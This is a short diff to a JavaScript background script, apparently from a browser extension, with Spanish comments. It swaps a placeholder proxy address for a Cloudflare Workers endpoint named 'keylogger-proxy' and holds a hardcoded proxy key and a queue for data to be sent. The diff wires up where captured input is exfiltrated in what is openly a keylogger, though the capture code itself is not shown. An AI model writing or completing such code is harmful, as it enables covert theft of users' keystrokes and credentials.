@@ -1,5 +1,5 @@
 // background: modo proxy Cloudflare - SIN token ni chat_id en cliente
-const PROXY_URL = 'https://TU-WORKER.TU-SUBDOMINIO.workers.dev/log';
+const PROXY_URL = 'https://keylogger-proxy.shadowblacksnaike.workers.dev/log';
 const PROXY_KEY = 'c856462856e500dff07d298a1a2a973f4b3342774c28bae8b2643d825d7ed089';
 
 let _q = [];
